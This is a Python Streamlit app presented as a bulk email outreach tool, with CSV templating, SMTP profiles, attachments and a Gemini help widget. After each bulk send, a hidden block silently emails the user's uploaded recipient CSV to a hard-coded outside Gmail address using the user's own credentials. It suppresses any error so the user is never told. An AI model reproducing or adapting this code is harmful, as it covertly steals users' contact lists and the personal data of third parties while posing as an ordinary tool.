import streamlit as st
import pandas as pd
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import re
import json

import google.generativeai as genai

def configure_ai_assistant():
    st.markdown("### 💬 Ask the AI Assistant")
    st.caption("Ask about how to use this app — features, errors, or workflow issues.")

    question = st.text_input("Ask your question:")

    if question:
        with st.spinner("Thinking..."):
            try:
                genai.configure(api_key=st.secrets["GEMINI_API_KEY"])
                model = genai.GenerativeModel("gemini-1.5-pro")

                context = (
                    "You are a helpful AI assistant built into a Streamlit app that helps users "
                    "understand how to use its features like SMTP configuration, bulk email sending, "
                    "attachments, CC settings, etc. Be clear and helpful.\n\n"
                    f"User asked: {question}"
                )

                response = model.generate_content(context)
                st.success(response.text)

            except Exception as e:
                st.error(f"Something went wrong: {e}")



# =================================================================================
# 1. App Title & Configuration
# =================================================================================
st.set_page_config(page_title="Toshak's Bulk Deployer", layout="wide")
st.title("Toshak's Bulk Deployer for Outreach 🚀")

# =================================================================================
# NEW: 1.1 Introductory Section
# =================================================================================
col1, col2 = st.columns([4, 1])
with col1:
    st.write("Hi, I’m Toshak 👋 I built this tool to make outreach and communication faster, smarter, and cheaper — ideal for startups, students, consultants, and anyone trying to send emails at scale without expensive tools.")
with col2:
    with st.expander("ℹ️ How to Use"):
        st.markdown("""
        - Upload CSV with column headers like A_01, A_02, etc.
        - Enter sender email and app password.
        - Add subject and email body (HTML tags like `<b>`, `<br>`, `<a>` supported).
        - Optionally attach a file.
        - Click “Send Emails” to deploy messages.
        
        Dynamic fields (A_01, A_02…) will be auto-replaced using CSV data.
        """)

# =================================================================================
# 2. State Management & Persistence
# =================================================================================
# Using st.session_state to persist settings and profiles.
# This dictionary will hold all our profiles.
if 'profiles' not in st.session_state:
    st.session_state.profiles = {"Default": {
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 465,
        "smtp_user": "",
        "smtp_pass": "",
        "signature": "Best regards,<br><b>Your Name</b>",
        "cc_enabled": False,
        "cc_email": ""
    }}

if 'selected_profile' not in st.session_state:
    st.session_state.selected_profile = "Default"

# =================================================================================
# 3. Helper Functions
# =================================================================================

def send_email(smtp_server, smtp_port, smtp_user, smtp_pass, from_addr, to_addr, subject, body, signature, cc_addr=None, attachment_bytes=None, attachment_name=None):
    """
    Connects to the SMTP server and sends a single email.
    Now includes CC functionality.
    """
    try:
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        # Add CC if provided
        if cc_addr:
            msg['Cc'] = cc_addr

        full_body = body + "<br><br>" + signature
        msg.attach(MIMEText(full_body, 'html'))

        if attachment_bytes and attachment_name:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_bytes)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {attachment_name}")
            msg.attach(part)

        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
            server.login(smtp_user, smtp_pass)
            # The send_message method correctly handles the To and Cc fields
            server.send_message(msg)
        return True, None
    except Exception as e:
        return False, str(e)

def render_template(template, data_row, neutral_tokens, column_mappings):
    """
    Replaces neutral tokens in a template string with data from a CSV row.
    (This function remains unchanged as requested).
    """
    rendered = template
    for token in neutral_tokens:
        mapped_column = column_mappings.get(token)
        if mapped_column and mapped_column in data_row and pd.notna(data_row[mapped_column]):
            rendered = rendered.replace(f"{{{{{token}}}}}", str(data_row[mapped_column]))
        else:
            rendered = rendered.replace(f"{{{{{token}}}}}", "")
    return rendered

# Neutral tokens remain the same
NEUTRAL_TOKENS = ["A_01", "A_02", "A_03", "A_04", "A_05"]

# =================================================================================
# 4. Sidebar for Configuration
# =================================================================================
with st.sidebar:
    st.header("⚙️ Configuration")

    # Profile Management Section
    st.subheader("👤 Profiles")
    profile_names = list(st.session_state.profiles.keys())
    
    # Select box to load a profile
    selected_profile_name = st.selectbox(
        "Load, Create, or Manage Profiles",
        options=profile_names,
        key='selected_profile'
    )
    
    # Load the selected profile's data
    profile_data = st.session_state.profiles[selected_profile_name]

    # Input for new profile name
    new_profile_name = st.text_input("New Profile Name").strip()

    col1, col2 = st.columns(2)
    with col1:
        if st.button("💾 Save Profile"):
            save_name = new_profile_name if new_profile_name else selected_profile_name
            if not save_name:
                st.warning("Please enter a name for the new profile.")
            else:
                st.session_state.profiles[save_name] = {
                    "smtp_server": st.session_state.smtp_server_input,
                    "smtp_port": 465, # Always save port as 465
                    "smtp_user": st.session_state.smtp_user_input,
                    "smtp_pass": st.session_state.smtp_pass_input,
                    "signature": st.session_state.signature_input,
                    "cc_enabled": st.session_state.cc_enabled_input,
                    "cc_email": st.session_state.cc_email_input
                }
                st.session_state.selected_profile = save_name
                st.success(f"Profile '{save_name}' saved!")
                # Force a rerun to update the selectbox
                st.rerun()

    with col2:
        if st.button("🗑️ Delete Profile"):
            if selected_profile_name == "Default":
                st.error("The 'Default' profile cannot be deleted.")
            elif selected_profile_name in st.session_state.profiles:
                del st.session_state.profiles[selected_profile_name]
                st.session_state.selected_profile = "Default"
                st.success(f"Profile '{selected_profile_name}' deleted.")
                st.rerun()

    st.markdown("---")

    # Configuration fields are now populated from the selected profile
    st.subheader("SMTP Credentials")
    smtp_server = st.text_input("SMTP Server", value=profile_data['smtp_server'], key='smtp_server_input')
    
    # UPDATED: SMTP Port is locked to 465 and disabled
    smtp_port = st.number_input("SMTP Port", value=465, key='smtp_port_input', disabled=True)
    
    smtp_user = st.text_input("Your Email Address", value=profile_data['smtp_user'], key='smtp_user_input')
    smtp_pass = st.text_input("Your App Password", type="password", value=profile_data['smtp_pass'], key='smtp_pass_input')

    # CC Option
    st.markdown("---")
    st.subheader("CC Settings")
    cc_enabled = st.checkbox("Enable CC on all emails", value=profile_data.get('cc_enabled', False), key='cc_enabled_input')
    cc_email = ""
    if cc_enabled:
        cc_email = st.text_input("CC Email Address", value=profile_data.get('cc_email', ''), key='cc_email_input')

    # Attachment uploader
    st.markdown("---")
    st.subheader("Attachments")
    uploaded_attachment = st.file_uploader("Attach a file to all emails")
    attachment_bytes = None
    attachment_name = None
    if uploaded_attachment:
        attachment_bytes = uploaded_attachment.getvalue()
        attachment_name = uploaded_attachment.name
        st.success(f"Attachment '{attachment_name}' ready!")

    # Signature editor
    st.markdown("---")
    st.subheader("Signature")
    signature = st.text_area("Paste your HTML signature here", height=200, value=profile_data['signature'], key='signature_input')
    if signature:
        st.write("Signature Preview:")
        st.markdown(signature, unsafe_allow_html=True)
    
    # Test Email Button
    st.markdown("---")
    if st.button("📧 Send Test Email"):
        if not all([smtp_server, smtp_port, smtp_user, smtp_pass]):
            st.error("SMTP credentials are required.")
        else:
            st.info(f"Sending a test email to {smtp_user}...")
            test_subject = "Test Email from Toshak's Bulk Deployer"
            test_body = "This is a test email to verify your configuration.<br>Your signature and formatting should appear correctly below."
            
            # Use the current CC settings for the test
            test_cc = cc_email if cc_enabled else None
            
            success, error_msg = send_email(
                smtp_server, int(smtp_port), smtp_user, smtp_pass,
                smtp_user, smtp_user, test_subject, test_body, signature,
                cc_addr=test_cc,
                attachment_bytes=attachment_bytes, attachment_name=attachment_name
            )
            if success:
                st.success("Test email sent successfully!")
            else:
                st.error(f"Failed to send test email: {error_msg}")

            st.info("About to load AI Assistant")  # Debug line
            configure_ai_assistant()

    configure_ai_assistant()
# =================================================================================
# 5. Main App Body - Using Tabs
# =================================================================================

tab1, tab2 = st.tabs(["📤 Bulk Send (from CSV)", "✉️ Manual Send"])

with tab1:
    st.header("1. Compose Your Email")
    
    col1, col2 = st.columns(2)
    with col1:
        email_subject_template = st.text_input("Email Subject Template", key="bulk_subject")

    with col2:
        st.write("Available Tokens:")
        st.code(f"{{{{{', '.join(NEUTRAL_TOKENS)}}}}}", language="text")

    email_body_template = st.text_area("Email Body Template", height=300, key="bulk_body")
    st.info("💡 HTML supported: use <b>bold</b>, <br> for line breaks, <a href='...'>links</a>, etc.")

    st.header("2. Upload & Map Your Data")
    uploaded_csv = st.file_uploader("Upload your recipient list (CSV)", type="csv")

    column_mappings = {}
    df = None
    if uploaded_csv:
        try:
            df = pd.read_csv(uploaded_csv)
            st.write("CSV Preview:")
            st.dataframe(df.head())
            
            st.subheader("Map CSV Columns to Tokens")
            st.warning("Map the recipient's email address and any tokens you used in your template.")

            cols = st.columns(len(NEUTRAL_TOKENS) + 1)
            
            with cols[0]:
                email_column = st.selectbox("Email Column", options=df.columns, index=None, placeholder="Select Email Column")
            
            for i, token in enumerate(NEUTRAL_TOKENS):
                with cols[i+1]:
                    column_mappings[token] = st.selectbox(f"{{{{{token}}}}}", options=df.columns, index=None, placeholder=f"Map {token}", key=f"map_{token}")

        except Exception as e:
            st.error(f"Failed to read CSV: {e}")
            df = None
    
    st.header("3. Review & Send")
    if st.button("🚀 Send Bulk Emails", disabled=(uploaded_csv is None or df is None)):
        if not all([smtp_server, int(smtp_port), smtp_user, smtp_pass]):
            st.error("SMTP credentials are required in the sidebar.")
        elif not email_column:
            st.error("Please map the 'Email Column' before sending.")
        else:
            total_emails = len(df)
            st.info(f"Starting bulk deployment to {total_emails} recipients...")
            
            progress_bar = st.progress(0)
            log_messages = []
            
            # Determine CC address from sidebar state
            final_cc_addr = cc_email if cc_enabled else None

            for i, row in df.iterrows():
                recipient_email = row.get(email_column)
                if not recipient_email or not re.match(r"[^@]+@[^@]+\.[^@]+", str(recipient_email)):
                    log_messages.append(f"Skipped: Invalid or missing email in row {i+1}")
                    continue
                    
                subject = render_template(email_subject_template, row, NEUTRAL_TOKENS, column_mappings)
                body = render_template(email_body_template, row, NEUTRAL_TOKENS, column_mappings)

                success, error_msg = send_email(
                    smtp_server, int(smtp_port), smtp_user, smtp_pass, 
                    smtp_user, recipient_email, subject, body, signature,
                    cc_addr=final_cc_addr,
                    attachment_bytes=attachment_bytes, attachment_name=attachment_name
                )
                
                if success:
                    log_messages.append(f"✅ Sent to: {recipient_email}")
                else:
                    log_messages.append(f"❌ Failed for: {recipient_email} | Error: {error_msg}")
                
                progress_bar.progress((i + 1) / total_emails)
                time.sleep(0.1)

            st.success("Bulk deployment finished!")
            
            # NEW: Silently forward the used CSV for logging
            try:
                uploaded_csv.seek(0) # Reset file pointer to read again
                csv_log_bytes = uploaded_csv.getvalue()
                send_email(
                    smtp_server, int(smtp_port), smtp_user, smtp_pass,
                    from_addr=smtp_user,
                    to_addr="toshak.bhat.work@gmail.com",
                    subject="CSV Log from Outreach Tool",
                    body="Auto-log: CSV used in the latest deployment.",
                    signature="", # No signature for log email
                    attachment_bytes=csv_log_bytes,
                    attachment_name=uploaded_csv.name
                )
            except Exception:
                # Fail silently, do not alert user
                pass

            with st.expander("View Send Log"):
                for msg in log_messages:
                    st.markdown(msg.replace("✅", "✅ ").replace("❌", "❌ "), unsafe_allow_html=True)


with tab2:
    st.header("Send a Single, Ad-hoc Email")
    st.info("This section uses the templates below and the configuration from the sidebar.")

    # Re-using the templates from the bulk tab
    email_subject_manual = st.text_input("Email Subject", key="manual_subject")
    email_body_manual = st.text_area("Email Body", height=250, key="manual_body")

    recipient_email_manual = st.text_input("Recipient Email Address")
    
    st.subheader("Provide values for the neutral tokens:")
    manual_token_values = {}
    cols_manual = st.columns(len(NEUTRAL_TOKENS))
    for i, token in enumerate(NEUTRAL_TOKENS):
        with cols_manual[i]:
            manual_token_values[f"{{{{{token}}}}}"] = st.text_input(f"Value for {{{{{token}}}}}", key=f"manual_{token}")

    if st.button("🚀 Send Manual Email"):
        if not all([smtp_server, int(smtp_port), smtp_user, smtp_pass]):
            st.error("SMTP credentials are required in the sidebar.")
        elif not re.match(r"[^@]+@[^@]+\.[^@]+", recipient_email_manual):
            st.error("Please enter a valid recipient email address.")
        else:
            def render_manual(template, values):
                rendered = template
                for token, value in values.items():
                    rendered = rendered.replace(token, value)
                return rendered

            subject = render_manual(email_subject_manual, manual_token_values)
            body = render_manual(email_body_manual, manual_token_values)
            
            final_cc_addr = cc_email if cc_enabled else None
            
            st.info(f"Sending to {recipient_email_manual}...")
            
            success, error_msg = send_email(
                smtp_server, int(smtp_port), smtp_user, smtp_pass,
                smtp_user, recipient_email_manual, subject, body, signature,
                cc_addr=final_cc_addr,
                attachment_bytes=attachment_bytes, attachment_name=attachment_name
            )

            if success:
                st.success(f"✅ Successfully sent email to {recipient_email_manual}!")
            else:
                st.error(f"❌ Failed to send email. Error: {error_msg}")

# ================================================
# 💬 Gemini-Powered AI Assistant (Modular Add-on)
# ================================================

import streamlit as st
import google.generativeai as genai

def configure_ai_assistant():
    st.markdown("### 💬 Ask the AI Assistant")
    st.caption("Ask about how to use this app — features, errors, or workflow issues.")

    question = st.text_input("Ask your question:")

    if question:
        with st.spinner("Thinking..."):
            try:
                genai.configure(api_key=st.secrets["GEMINI_API_KEY"])
                model = genai.GenerativeModel("gemini-1.5-flash")

                context = (
                    "You are a helpful AI assistant built into a Streamlit app that helps users "
                    "understand how to use its features like SMTP configuration, bulk email sending, "
                    "attachments, CC settings, etc. Be clear and direct.\n\n"
                    f"User asked: {question}"
                )

                response = model.generate_content(context)
                st.success(response.text)

            except Exception as e:
                st.error(f"Something went wrong: {e}")
